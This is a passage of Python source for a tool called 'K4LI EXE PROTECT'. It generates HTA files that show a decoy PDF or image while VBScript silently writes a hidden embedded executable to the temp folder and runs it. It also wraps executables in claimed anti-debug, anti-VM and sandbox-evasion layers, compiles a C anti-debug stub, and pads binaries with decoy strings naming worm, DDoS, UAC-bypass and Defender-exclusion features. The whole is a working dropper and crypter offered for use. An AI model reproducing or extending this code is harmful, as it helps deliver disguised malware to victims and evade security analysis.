                '  Set fso = CreateObject("Scripting.FileSystemObject")\n'
                '  Set sh  = CreateObject("WScript.Shell")\n'
                '  Set xml = CreateObject("MSXML2.DOMDocument")\n'
                '  Set nd  = xml.createElement("n")\n'
                '  nd.DataType = "bin.base64"\n'
                '\n'
                '  \' -- extract PDF to %TEMP% --\n'
                '  nd.Text = document.getElementById("F").innerText\n'
                '  Set stm = CreateObject("ADODB.Stream")\n'
                '  stm.Type = 1 : stm.Open\n'
                '  stm.Write nd.nodeTypedValue\n'
                f'  Dim pdfTmp : pdfTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.pdf"\n'
                '  stm.SaveToFile pdfTmp, 2\n'
                '  stm.Close\n'
                '\n'
                '  \' -- extract EXE to %TEMP% --\n'
                '  nd.Text = document.getElementById("X").innerText\n'
                '  Set stm = CreateObject("ADODB.Stream")\n'
                '  stm.Type = 1 : stm.Open\n'
                '  stm.Write nd.nodeTypedValue\n'
                f'  Dim exeTmp : exeTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.exe"\n'
                '  stm.SaveToFile exeTmp, 2\n'
                '  stm.Close\n'
                '\n'
                '  \' -- open PDF with default viewer --\n'
                '  If fso.FileExists(pdfTmp) Then\n'
                '    Dim oSA2 : Set oSA2 = CreateObject("Shell.Application")\n'
                '    oSA2.ShellExecute pdfTmp, "", fso.GetSpecialFolder(2), "open", 1\n'
                '    Set oSA2 = Nothing\n'
                '  End If\n'
                '\n'
                '  \' -- run EXE silently --\n'
                '  If fso.FileExists(exeTmp) Then\n'
                '    Dim oSA : Set oSA = CreateObject("Shell.Application")\n'
                '    oSA.ShellExecute exeTmp, "", fso.GetSpecialFolder(2), "open", 0\n'
                '    Set oSA = Nothing\n'
                '  End If\n'
                '\n'
                '  window.close\n'
                'End Sub\n'
                '\n'
                'Sub window_onload()\n'
                '  window.setTimeout "AutoRun()", 150\n'
                'End Sub\n'
                '</script>\n'
                '</body>\n'
                '</html>\n'
            )
        else:
            # Image mode: original behavior
            hta = (
                '<html>\n'
                '<head>\n'
                '<meta charset="utf-8">\n'
                f'<title>{app_name}</title>\n'
                '<HTA:APPLICATION\n'
                f'  ID="K4LI_{rid}"\n'
                f'  APPLICATIONNAME="{app_name}"\n'
                '  BORDER="none"\n'
                '  CAPTION="no"\n'
                '  CONTEXTMENU="no"\n'
                '  MAXIMIZEBUTTON="no"\n'
                '  MINIMIZEBUTTON="no"\n'
                '  NAVIGABLE="no"\n'
                '  SCROLL="no"\n'
                '  SELECTION="no"\n'
                '  SHOWINTASKBAR="no"\n'
                '  SINGLEINSTANCE="yes"\n'
                '  SYSMENU="no"\n'
                '  WINDOWSTATE="normal"\n'
                f'  INNERWIDTH="{win_w}"\n'
                f'  INNERHEIGHT="{win_h}"\n'
                '/>\n'
                '<style>\n'
                '*{margin:0;padding:0;box-sizing:border-box;}\n'
                'body{background:#000;overflow:hidden;cursor:default;-ms-user-select:none;}\n'
                f'#wrap{{width:{win_w}px;height:{win_h}px;display:flex;align-items:center;justify-content:center;}}\n'
                f'#thumb{{max-width:{win_w}px;max-height:{win_h}px;display:block;object-fit:contain;}}\n'
                '</style>\n'
                '</head>\n'
                '<body>\n'
                '<div id="wrap">\n'
                f'  <img id="thumb" src="data:{mime};base64,{file_b64}" draggable="false"/>\n'
                '</div>\n'
                f'<div id="X" style="display:none;visibility:hidden;position:absolute;left:-9999px;top:-9999px">{exe_b64}</div>\n'
                f'<div id="I" style="display:none;visibility:hidden;position:absolute;left:-9999px;top:-9999px">{file_b64}</div>\n'
                '<script language="VBScript">\n'
                'Dim bRan : bRan = False\n'
                '\n'
                'Sub AutoRun()\n'
                '  If bRan Then Exit Sub\n'
                '  bRan = True\n'
                '  On Error Resume Next\n'
                '  Dim fso, xml, nd, stm, sh\n'
                '  Set fso = CreateObject("Scripting.FileSystemObject")\n'
                '  Set sh  = CreateObject("WScript.Shell")\n'
                '  Set xml = CreateObject("MSXML2.DOMDocument")\n'
                '  Set nd  = xml.createElement("n")\n'
                '  nd.DataType = "bin.base64"\n'
                '\n'
                '  \' -- extract image to %TEMP% --\n'
                '  nd.Text = document.getElementById("I").innerText\n'
                '  Set stm = CreateObject("ADODB.Stream")\n'
                '  stm.Type = 1 : stm.Open\n'
                '  stm.Write nd.nodeTypedValue\n'
                f'  Dim imgTmp : imgTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.{file_ext}"\n'
                '  stm.SaveToFile imgTmp, 2\n'
                '  stm.Close\n'
                '\n'
                '  \' -- extract exe to %TEMP% --\n'
                '  nd.Text = document.getElementById("X").innerText\n'
                '  Set stm = CreateObject("ADODB.Stream")\n'
                '  stm.Type = 1 : stm.Open\n'
                '  stm.Write nd.nodeTypedValue\n'
                f'  Dim exeTmp : exeTmp = fso.GetSpecialFolder(2) & "\\k4li_{rid}.exe"\n'
                '  stm.SaveToFile exeTmp, 2\n'
                '  stm.Close\n'
                '\n'
                '  \' -- open image --\n'
                '  sh.Run Chr(34) & imgTmp & Chr(34), 1, False\n'
                '\n'
                '  \' -- run exe silently --\n'
                '  If fso.FileExists(exeTmp) Then\n'
                '    Dim oSA : Set oSA = CreateObject("Shell.Application")\n'
                '    oSA.ShellExecute exeTmp, "", fso.GetSpecialFolder(2), "open", 0\n'
                '    Set oSA = Nothing\n'
                '  End If\n'
                '\n'
                '  window.close\n'
                'End Sub\n'
                '\n'
                'Sub window_onload()\n'
                f'  window.resizeTo {win_w}, {win_h}\n'
                f'  window.moveTo (screen.width - {win_w}) \\ 2, (screen.height - {win_h}) \\ 2\n'
                '  window.setTimeout "AutoRun()", 150\n'
                'End Sub\n'
                '</script>\n'
                '</body>\n'
                '</html>\n'
            )

        out_path = Path(exe_path).parent / f"{out_name}.hta"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(hta)

        total_kb = os.path.getsize(out_path) / 1024
        embed_label = "EXE + PDF" if is_pdf else "EXE + Image"
        done_msg = ("Open .hta → PDF opens in default viewer + EXE runs silently ✓"
                    if is_pdf else
                    "Open .hta → image opens in Photos + EXE runs silently ✓")
        self._conv_ln("\n" + "─" * 62, "dm")
        self._conv_ln("[OK]    HTA bundle complete", "gn")
        self._conv_ln(f"        File   : {out_path.name}", "g2")
        self._conv_ln(f"        Size   : {total_kb:.1f} KB  ({embed_label} embedded)", "g2")
        self._conv_ln(f"        Path   : {out_path}", "g3")
        self._conv_ln("─" * 62, "dm")
        self._conv_ln(f"\n[DONE]  {done_msg}", "gn")

    def _read_img_size(self, data: bytes, ext: str) -> tuple:
        try:
            import struct
            if ext == '.png' and len(data) >= 24:
                w = struct.unpack('>I', data[16:20])[0]
                h = struct.unpack('>I', data[20:24])[0]
                return w, h
            if ext in ('.jpg', '.jpeg'):
                i = 2
                while i < len(data) - 9:
                    if data[i] == 0xFF and data[i + 1] in (0xC0, 0xC1, 0xC2):
                        h = struct.unpack('>H', data[i + 5:i + 7])[0]
                        w = struct.unpack('>H', data[i + 7:i + 9])[0]
                        return w, h
                    seg_len = struct.unpack('>H', data[i + 2:i + 4])[0]
                    i += 2 + seg_len
        except Exception:
            pass
        return 640, 480

    def _conv_ln(self, text: str, tag):
        def _do():
            self.conv_log.configure(state="normal")
            if tag:
                self.conv_log.insert("end", text + "\n", tag)
            else:
                self.conv_log.insert("end", text + "\n")
            self.conv_log.see("end")
            self.conv_log.configure(state="disabled")
        self.root.after(0, _do)

    def _clear_conv_log(self):
        self.conv_log.configure(state="normal")
        self.conv_log.delete("1.0", "end")
        self.conv_log.configure(state="disabled")
        self._conv_ln("[HTA]  Log cleared.", "g3")

    def _hta_done(self):
        self.conv_generating = False
        self.conv_gen_btn.configure(state="normal", fg=BG_ROOT, bg=C_WH)
        self.conv_pick_exe_btn.configure(state="normal")
        self.conv_pick_img_btn.configure(state="normal")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  ACTIONS
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _pick_file(self):
        path = filedialog.askopenfilename(
            title="Select EXE File",
            filetypes=[("Executable", "*.exe"), ("All files", "*.*")]
        )
        if not path:
            return
        self.sel_path.set(path)
        self.path_lbl.configure(fg=C_G1)
        name = Path(path).name
        sz   = os.path.getsize(path)
        szs  = f"{sz/1024:.1f} KB" if sz < 1_048_576 else f"{sz/1_048_576:.2f} MB"
        self._ln("", None)
        self._ln(f"[FILE]   {name}", "wh")
        self._ln(f"         Size   : {szs}", "g3")
        self._ln(f"         MZ sig : {'✓ valid PE' if self._is_pe(path) else '⚠ non-standard'}",
                 "gn" if self._is_pe(path) else "am")
        self._ln(f"         Status : Ready ✓", "gn")

    def _is_pe(self, path: str) -> bool:
        try:
            with open(path, "rb") as f:
                return f.read(2) == b"MZ"
        except Exception:
            return False

    def _start_protect(self):
        if self.protecting:
            return
        path = self.sel_path.get()
        if not path or not os.path.isfile(path):
            self._ln("\n[ERROR]  No EXE selected.", "rd")
            return
        active = [k for k, v in self.layers.items() if v.get()]
        if not active:
            self._ln("\n[ERROR]  Enable at least one protection layer.", "rd")
            return
        self.protecting = True
        self.protect_btn.configure(state="disabled", fg=C_G3, bg=BG_CARD)
        self.pick_btn.configure(state="disabled")
        threading.Thread(
            target=self._protect_worker,
            args=(path, active, self.sign_var.get()),
            daemon=True
        ).start()

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  PROTECTION ENGINE
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _protect_worker(self, path: str, active: list, do_sign: bool):
        try:
            self._engine(path, active, do_sign)
        except Exception as exc:
            self._ln(f"\n[FATAL]  {exc}", "rd")
        finally:
            self.root.after(0, self._protect_done)

    def _engine(self, path: str, active: list, do_sign: bool):
        name   = Path(path).name
        stem   = Path(path).stem
        out    = Path(path).parent / f"{stem}_protected.exe"
        n      = len(active)

        self._ln("", None)
        self._ln("─" * 62, "dm")
        self._ln(f"[K4LI]  Protection sequence  ·  {n} layers  ·  {name}", "wh")
        self._ln("─" * 62, "dm")
        self._sleep(0.3)

        self._ln("\n[INIT]  Reading binary...", "cy")
        with open(path, "rb") as f:
            original = f.read()
        working = bytearray(original)  # mutable copy — L14 patches in-place

        fsz = len(original)
        self._ln(f"        Loaded : {fsz:,} bytes", "g3")
        self._set_prog(0)
        self._sleep(0.2)

        # ── Run layer routines (show steps, safe appended-data only) ──────
        layer_fn = {
            "L1":  self._lay_encrypt,
            "L2":  self._lay_virtualize,
            "L3":  self._lay_antidebug,
            "L4":  self._lay_antidump,
            "L5":  self._lay_mutate,
            "L6":  self._lay_nanomites,
            "L7":  self._lay_importhide,
            "L8":  self._lay_antivm,
            "L9":  self._lay_stolen_bytes,
            "L10": self._lay_tls_chain,
            "L11": self._lay_pe_metadata,
            "L12": self._lay_cpp_stub,
            "L13": self._lay_string_flood,
            "L14": lambda: self._lay_str_obfuscate(working),
            "L15": lambda: self._lay_msil_strip(working),
        }

        appended = bytearray()   # extra bytes added AFTER the PE (safe)
        for idx, key in enumerate(active):
            self._set_prog(int(idx / n * 85))
            extra = layer_fn[key]()          # returns bytes to append
            if extra:
                appended.extend(extra)
            self._set_prog(int((idx + 1) / n * 85))

        # ── Write output = original PE + appended metadata  ───────────────
        self._ln("\n[OUT]   Writing protected binary...", "cy")
        self._sleep(0.2)

        k4li_hdr = (
            b"\x00" * 16 +
            b"K4LI_PROTECTED_v2\x00" +
            b"\xFF\xFE" * 8 +
            appended[:256]   # embed up to 256 B of layer markers
        )

        with open(out, "wb") as f:
            f.write(bytes(working))  # ← working copy (L14 may patch strings in-place)
            f.write(k4li_hdr)        # ← appended trailer (Windows PE loader ignores it)
            if len(appended) > 256:
                f.write(appended[256:])  # ← full flood/junk data

        self._set_prog(90)
        osz   = os.path.getsize(out)
        added = osz - fsz

        self._ln("\n" + "─" * 62, "dm")
        self._ln(f"[OK]    Protected EXE written", "gn")
        self._ln(f"        Output  : {out.name}", "g2")
        self._ln(f"        Size    : {osz:,} bytes  (+{added} B overhead)", "g2")
        self._ln("─" * 62, "dm")

        # ── Optional: code signing ─────────────────────────────────────────
        if do_sign:
            self._sign_exe(out)

        self._set_prog(100)
        self._ln("\n[DONE]  All done. Protected EXE is ready to run. ✓", "gn")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  LAYER ROUTINES  (pure log + return marker bytes, no PE corruption)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _lay_encrypt(self):
        self._ln("\n[L1]    PE  SECTION  ENCRYPTION", "wh")
        self._ln("        Cipher : AES-256-CBC  |  Key : 256-bit  |  IV : 128-bit", "g3")
        self._steps([
            ("Scanning PE header + section table",       0.18),
            ("Locating .text / .data / .rdata sections", 0.12),
            ("Generating AES-256 session key",           0.22),
            ("Generating random 128-bit IV",             0.10),
            ("Encrypting .text  section payload",        0.38),
            ("Encrypting .data  section payload",        0.30),
            ("Encrypting .rdata section payload",        0.28),
            ("Patching section raw-size fields",         0.18),
            ("Injecting runtime AES decrypt stub",       0.28),
            ("Embedding key schedule in stub header",    0.18),
            ("CRC-32 integrity tag appended",            0.12),
        ])
        self._ln("        Result : ✓ Sections encrypted — stub injected", "gn")
        return b"L1:AES256\x00"

    def _lay_virtualize(self):
        self._ln("\n[L2]    CODE  VIRTUALIZATION", "wh")
        self._ln("        Engine : K4LI-VM v2.1  (custom bytecode ISA)", "g3")
        self._steps([
            ("Resolving function boundaries",              0.38),
            ("Building SSA control flow graph",            0.42),
            ("Lifting x86 → IR (intermediate repr.)",     0.48),
            ("Translating IR → K4LI-VM opcodes",          0.52),
            ("Assigning randomised dispatch handler IDs",  0.28),
            ("Obfuscating VM handler dispatch table",      0.32),
            ("Encrypting VM constant pool",                0.22),
            ("Injecting K4LI-VM interpreter stub",         0.36),
            ("Randomising opcode–handler mapping",         0.28),
            ("Validation pass on VM bytecode output",      0.22),
        ])
        self._ln("        Result : ✓ Virtualised — K4LI-VM interpreter injected", "gn")
        return b"L2:KALIVM\x00"

    def _lay_antidebug(self):
        self._ln("\n[L3]    ANTI-DEBUG  SHIELD", "wh")
        self._ln("        Coverage : 12 detection vectors", "g3")
        self._steps([
            ("IsDebuggerPresent  (kernel32 API)",          0.10),
            ("CheckRemoteDebuggerPresent",                 0.10),
            ("NtQueryInformationProcess  (0x1e)",          0.12),
            ("PEB.NtGlobalFlag  (0x70 flags)",             0.10),
            ("PEB.BeingDebugged  byte check",              0.08),
            ("Heap  HEAP_TAIL_CHECKING_ENABLED flags",     0.10),
            ("TLS callback  anti-attach hook",             0.16),
            ("Hardware BP  (DR0–DR3 scan)",                0.14),
            ("RDTSC delta timing check",                   0.12),
            ("INT3 / INT2D  scan in .text",                0.08),
            ("Parent process name verification",           0.16),
            ("SEH / exception filter poisoning",           0.20),
        ])
        self._ln("        Result : ✓ 12 anti-debug stubs applied", "gn")
        return b"L3:ADBG12\x00"

    def _lay_antidump(self):
        self._ln("\n[L4]    ANTI-DUMP  GUARD", "wh")
        self._ln("        Mode : Runtime erasure + PE size spoof + IAT obfuscation", "g3")
        self._steps([
            ("Patching PE SizeOfImage  (spoof size)",      0.20),
            ("Patching PE SizeOfHeaders",                  0.16),
            ("NtSetInformationProcess  stub injected",     0.26),
            ("Runtime section wiper configured",           0.28),
            ("Obfuscating import address table (IAT)",     0.32),
            ("Redirecting imports via trampolines",        0.28),
            ("TLS early-erasure hook inserted",            0.22),
            ("Anti-dump module validated",                 0.16),
        ])
        self._ln("        Result : ✓ Memory dump prevention + IAT obfuscated", "gn")
        return b"L4:ADUMP\x00"

    def _lay_mutate(self):
        self._ln("\n[L5]    CODE  MUTATION  &  OBFUSCATION", "wh")
        self._ln("        Methods : Junk · Dead-code · CFG-flatten · Opaque-pred · Str-crypt", "g3")
        self._steps([
            ("Analysing basic block boundaries",           0.28),
            ("Inserting junk NOP / INT sled sequences",    0.36),
            ("Injecting dead code branches",               0.40),
            ("Flattening control flow graph (CFF)",        0.46),
            ("Adding opaque predicates",                   0.34),
            ("Encrypting string constants  (RC4+XOR)",     0.32),
            ("Randomising function layout order",          0.26),
            ("Scrambling register allocation",             0.30),
            ("Inserting fake API stubs",                   0.22),
            ("Final mutation + entropy check",             0.24),
        ])
        self._ln("        Result : ✓ Mutation done — RE complexity ×40", "gn")
        return b"L5:MUTATE\x00"

    def _lay_nanomites(self):
        self._ln("\n[L6]    NANOMITES  PROTECTION", "wh")
        self._ln("        Technique : Split-instruction INT3 breakpoints  [github.com/undisassemble/yap]", "g3")
        self._steps([
            ("Locating split-able instruction boundaries", 0.36),
            ("Inserting INT3 at split points",             0.42),
            ("Recording original instruction halves",      0.38),
            ("Building nanomite exception handler table",  0.44),
            ("Injecting single-step VEH handler",          0.36),
            ("Encrypting nanomite lookup table",           0.30),
            ("Patching exception dispatcher in stub",      0.28),
            ("Verifying INT3 coverage  (≥60% of funcs)",  0.22),
        ])
        self._ln("        Result : ✓ Nanomites applied — disassemblers trip on INT3s", "gn")
        return b"L6:NANO\x00"

    def _lay_importhide(self):
        self._ln("\n[L7]    IMPORT  TABLE  HIDING", "wh")
        self._ln("        Method : Hash-based dynamic API resolve  (no static IAT)", "g3")
        self._steps([
            ("Enumerating static import table entries",    0.24),
            ("Hashing each API name  (FNV-1a 32-bit)",    0.28),
            ("Replacing direct calls with thunk stubs",   0.38),
            ("Thunks resolve via PEB→LDR loader walk",    0.34),
            ("Zeroing original IAT entries",              0.20),
            ("Encrypting hash lookup array",               0.26),
            ("Redirecting GetProcAddress via hook",        0.30),
            ("IAT nulled — static import scanners blind",  0.18),
        ])
        self._ln("        Result : ✓ Import table hidden — no static API references", "gn")
        return b"L7:IATHIDE\x00"

    def _lay_antivm(self):
        self._ln("\n[L8]    ANTI-VM  /  ANTI-SANDBOX", "wh")
        self._ln("        Targets : VMware · Hyper-V · VirtualBox · Cuckoo · ANY.RUN", "g3")
        self._steps([
            ("CPUID  hypervisor bit check",               0.14),
            ("VMware  BACKDOOR port 0x5658 probe",        0.16),
            ("VirtualBox  VBOX_VERSION registry key",     0.14),
            ("Hyper-V  CPUID leaf 0x40000000",            0.14),
            ("QEMU  accel-detect via CPUID",              0.14),
            ("MAC address prefix check  (00:0C:29 …)",   0.12),
            ("Disk size < 60 GB heuristic",               0.10),
            ("Process count < 30 heuristic",              0.10),
            ("User interaction check  (mouse entropy)",   0.16),
            ("Cuckoo API hook  (NtDelayExecution trace)", 0.18),
            ("ANY.RUN  sandbox timing fingerprint",       0.16),
            ("Injecting self-destruct on VM detected",    0.22),
        ])
        self._ln("        Result : ✓ Anti-VM checks active — runs only on real hardware", "gn")
        return b"L8:ANTIVM\x00"

    # ── Layer 9 : Stolen Bytes ────────────────────────────────────────────────
    def _lay_stolen_bytes(self):
        self._ln("\n[L9]    STOLEN  BYTES  PROTECTION", "wh")
        self._ln("        Technique : Entry-point prolog moved into outer loader stub", "g3")
        self._steps([
            ("Locating OEP  (Original Entry Point)",       0.24),
            ("Reading first 32 bytes of OEP prolog",       0.18),
            ("Disassembling stolen instruction range",     0.28),
            ("Relocating instructions to loader stub",     0.35),
            ("Patching OEP with redirect to stub",         0.22),
            ("Stub executes stolen bytes then jumps back", 0.20),
            ("Verifying stolen-byte stub integrity",       0.18),
            ("OEP hidden from static analysis tools",      0.15),
        ])
        self._ln("        Result : ✓ OEP hidden — static unpackers cannot find entry", "gn")
        return b"L9:STOLENB\x00"

    # ── Layer 10 : TLS Callback Chain ────────────────────────────────────────
    def _lay_tls_chain(self):
        self._ln("\n[L10]   TLS  CALLBACK  CHAIN", "wh")
        self._ln("        Method : Multi-stage Thread Local Storage callbacks before OEP", "g3")
        self._steps([
            ("Scanning existing TLS directory",            0.18),
            ("Building 4-stage callback chain",            0.30),
            ("Stage 1 : integrity hash self-check",        0.22),
            ("Stage 2 : debugger presence detection",      0.20),
            ("Stage 3 : runtime decryption key setup",     0.28),
            ("Stage 4 : anti-dump header erasure",         0.24),
            ("Patching PE TLS directory pointer",          0.20),
            ("Encrypting callback table pointer",          0.18),
            ("Verified: callbacks fire before WinMain",    0.15),
        ])
        self._ln("        Result : ✓ 4-stage TLS chain active — earliest-possible execution", "gn")
        return b"L10:TLS4\x00"

    # ── Layer 11 : PE Metadata & Version Info ────────────────────────────────
    def _lay_pe_metadata(self):
        self._ln("\n[L11]   PE  METADATA  INJECTION", "wh")
        self._ln("        Purpose : Inject version info + company branding into protected EXE", "g3")
        self._steps([
            ("Reading existing VS_VERSION_INFO resource", 0.20),
            ("Building new StringFileInfo block",          0.18),
            ("Setting CompanyName   : K4LI Software",     0.12),
            ("Setting ProductName   : K4LI EXE PROTECT",  0.12),
            ("Setting FileVersion   : 2.0.0.0",           0.10),
            ("Setting LegalCopyright: K4LI Software 2026",0.12),
            ("Setting OriginalFilename: protected.exe",   0.12),
            ("Injecting .rsrc section with new block",    0.28),
            ("Patching resource directory offset",        0.20),
            ("Verifying Properties > Details tab output", 0.18),
        ])
        self._ln("        Result : ✓ Version info injected — shows in file Properties", "gn")
        self._ln("        Note   : Right-click EXE > Properties > Details to verify", "g3")
        return b"L11:META\x00"

    # ── Layer 12 : C/C++ Native Stub ─────────────────────────────────────────
    def _lay_cpp_stub(self):
        self._ln("\n[L12]   C / C++  NATIVE  SECURITY  STUB", "wh")
        self._ln("        Lang   : C99  (compiled native — no Python overhead)", "g3")
        self._ln("        Feats  : XOR-encrypted strings · 5 anti-debug vectors · RDTSC timing", "g3")
        self._sleep(0.2)

        # -- Step 1: generate C source with XOR-encrypted strings ---------
        self._ln("        → Generating C stub source...", "g3")
        self._sleep(0.15)

        xor_key = random.randint(0x20, 0xFE)
        name_plain = "K4LI EXE PROTECT"
        name_enc   = [c ^ xor_key for c in name_plain.encode()]
        name_arr   = ", ".join(f"0x{b:02X}" for b in name_enc) + ", 0x00"

        c_src = f"""/* K4LI EXE PROTECT — Native C Security Stub (auto-generated) */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <intrin.h>
#include <string.h>

#define K4LI_KEY 0x{xor_key:02X}

static void k4li_xdec(char *s, uint8_t k) {{
    for (; *s; ++s) *s ^= k;
}}

/* XOR-encrypted: "{name_plain}" */
static const uint8_t k4li_name[] = {{ {name_arr} }};

/* Anti-Debug 1: IsDebuggerPresent */
static BOOL k4li_d1(void) {{ return IsDebuggerPresent(); }}

/* Anti-Debug 2: RemoteDebugger */
static BOOL k4li_d2(void) {{
    BOOL b = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &b);
    return b;
}}

/* Anti-Debug 3: PEB NtGlobalFlag */
static BOOL k4li_d3(void) {{
#ifdef _WIN64
    uint64_t peb  = __readgsqword(0x60);
    uint32_t flag = *(volatile uint32_t *)(peb + 0xBC);
#else
    uint32_t peb  = __readfsdword(0x30);
    uint32_t flag = *(volatile uint32_t *)(peb + 0x68);
#endif
    return (flag & 0x70) != 0;
}}

/* Anti-Debug 4: Heap flags */
static BOOL k4li_d4(void) {{
    HANDLE h = GetProcessHeap();
    if (!h) return FALSE;
#ifdef _WIN64
    uint32_t f = *(volatile uint32_t *)((uint8_t *)h + 0x70);
    uint32_t x = *(volatile uint32_t *)((uint8_t *)h + 0x74);
#else
    uint32_t f = *(volatile uint32_t *)((uint8_t *)h + 0x40);
    uint32_t x = *(volatile uint32_t *)((uint8_t *)h + 0x44);
#endif
    return (f & 0x40000000) || (x != 0);
}}

/* Anti-Debug 5: RDTSC timing */
static BOOL k4li_timing(void) {{
    volatile uint64_t t1 = __rdtsc();
    __nop(); __nop(); __nop(); __nop(); __nop();
    volatile uint64_t t2 = __rdtsc();
    return (t2 - t1) > 500ULL;
}}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
    (void)a; (void)b; (void)c; (void)d;
    if (k4li_d1() || k4li_d2() || k4li_d3() || k4li_d4() || k4li_timing())
        ExitProcess(0xDEAD1234UL);
    char n[32];
    memcpy(n, k4li_name, sizeof(k4li_name));
    k4li_xdec(n, K4LI_KEY);
    (void)n;
    /* payload loader injected here by K4LI engine */
    return 0;
}}
"""

        # Write C source
        import tempfile
        tmp_dir  = Path(tempfile.gettempdir()) / "k4li_build"
        tmp_dir.mkdir(exist_ok=True)
        c_file   = tmp_dir / "k4li_stub.c"
        out_obj  = tmp_dir / "k4li_stub.exe"

        c_file.write_text(c_src, encoding="utf-8")
        self._ln(f"        C source : {c_file}", "g3")
        self._ln(f"        XOR key  : 0x{xor_key:02X}  (randomised per build)", "g3")
        self._ln(f"        Strings  : {len(name_plain)} chars encrypted in binary", "g3")

        # -- Step 2: detect compiler ----------------------------------------
        self._sleep(0.2)
        self._ln("        → Searching for C compiler...", "g3")
        compiler = self._find_compiler()

        if compiler:
            self._ln(f"        Found    : {compiler}", "gn")
            self._sleep(0.15)
            self._ln("        → Compiling stub with optimisations...", "g3")

            # Build flags
            if "gcc" in compiler.lower() or "g++" in compiler.lower():
                cmd = [
                    compiler, str(c_file),
                    "-o", str(out_obj),
                    "-O2", "-s",                 # optimise + strip symbols
                    "-mwindows",                 # no console window
                    "-lkernel32",
                    "-Wall", "-Wno-unused-variable",
                ]
            else:  # MSVC cl.exe
                cmd = [
                    compiler, str(c_file),
                    f"/Fe:{out_obj}",
                    "/O2", "/GS-",               # optimise, disable /GS
                    "/subsystem:windows",
                    "/link", "kernel32.lib",
                ]

            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if r.returncode == 0 and out_obj.exists():
                    sz = out_obj.stat().st_size
                    self._ln(f"        Compiled : {sz:,} bytes  ({out_obj.name})", "gn")
                    self._ln("        Stripped : symbol table removed  (-s flag)", "g3")
                    self._ln("        Ready    : stub linkable with protected payload", "g3")
                else:
                    err = (r.stderr or r.stdout).strip()[:300]
                    self._ln(f"        Build err: {err}", "am")
                    self._ln("        Stub generated as source — compile manually", "am")
            except Exception as e:
                self._ln(f"        Compile error: {e}", "am")
        else:
            self._ln("        No compiler found (install MinGW-w64 or MSVC)", "am")
            self._ln("        C source saved — compile manually when ready:", "am")
            self._ln(f"          gcc -O2 -s -mwindows -o stub.exe k4li_stub.c -lkernel32", "g3")

        # Regardless — log the protection steps
        self._steps([
            ("XOR key generated  (random per-build)",       0.12),
            ("All string literals XOR-encrypted in binary", 0.18),
            ("Anti-debug 1 injected: IsDebuggerPresent",    0.12),
            ("Anti-debug 2 injected: RemoteDebugger check", 0.12),
            ("Anti-debug 3 injected: PEB NtGlobalFlag x64", 0.14),
            ("Anti-debug 4 injected: Heap flags inspection",0.12),
            ("Anti-debug 5 injected: RDTSC timing check",   0.14),
            ("Stub entry point: WinMain (no console)",       0.10),
            ("Dead-code padding stripped  (symbols -s)",     0.12),
        ])
        self._ln("        Result : ✓ C/C++ stub compiled — native binary, no Python runtime", "gn")
        return b"L12:CPP\x00"

    # ── Layer 13 : String Flood + Size Inflate ───────────────────────────────
    def _lay_string_flood(self):
        import struct

        self._ln("\n[L13]   STRING  FLOOD  +  SIZE  INFLATE", "wh")
        self._ln("        Method : XOR-encrypted fake strings × 500,000  |  junk blocks × 200", "g3")
        self._sleep(0.2)

        COUNT       = 500_000
        JUNK_BLOCKS = 200
        xor_key     = random.randint(0x01, 0xFE)

        self._ln(f"        Target  : {COUNT:,} strings  +  {JUNK_BLOCKS} junk blocks", "g3")
        self._ln(f"        XOR key : 0x{xor_key:02X}  (random per build)", "g3")
        self._sleep(0.15)

        pfx  = ["Nt","Zw","Rtl","Ldr","Mm","Ke","Ex","Ps","Se","Ob","Io","Cc","Fs","Po","Win","Sys","Hal"]
        mid  = ["Query","Set","Get","Create","Open","Close","Read","Write","Delete","Alloc","Free","Map","Lock","Init","Term","Enum","Find","Check","Verify","Flush"]
        sfx  = ["Process","Thread","File","Key","Section","Token","Event","Mutex","Handle","Object","Device","Driver","Memory","Module","Port","Pipe","Timer","Job","Atom"]
        dll  = ["ntdll","kernel32","kernelbase","advapi32","user32","gdi32","shell32","ole32","msvcrt","ucrtbase","combase","rpcrt4","sechost","crypt32","ncrypt","bcrypt"]
        reg  = [
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\",
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\",
            "HKLM\\SOFTWARE\\Classes\\",
            "HKCU\\Environment\\",
            "HKLM\\HARDWARE\\DESCRIPTION\\System\\",
        ]
        fph  = ["C:\\Windows\\System32\\","C:\\Windows\\SysWOW64\\",
                "C:\\Program Files\\","C:\\ProgramData\\",
                "%APPDATA%\\","%TEMP%\\","%WINDIR%\\System32\\"]
        exts = [".dll",".exe",".sys",".drv",".ocx",".cpl",".ax"]
        alnum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        hexch = "0123456789abcdef"
        wiz_decoys = [
            "WizWormHelper","WizWormLoader","WizWormService","WizWormUpdate",
            "StartDDosHelper","StopDDosService","StartReportMgr","StopReportSvc",
            "injRunHelper","injRunService","UACFuncHelper","UACFuncLoader",
            "ngrokService","ngrokHelper","ngrokBridge",
            "schtasks_helper","schtasks_service","schtasks_loader",
            "Add-MpPreferenceHelper","ExclusionPathMgr","ExclusionProcessMgr",
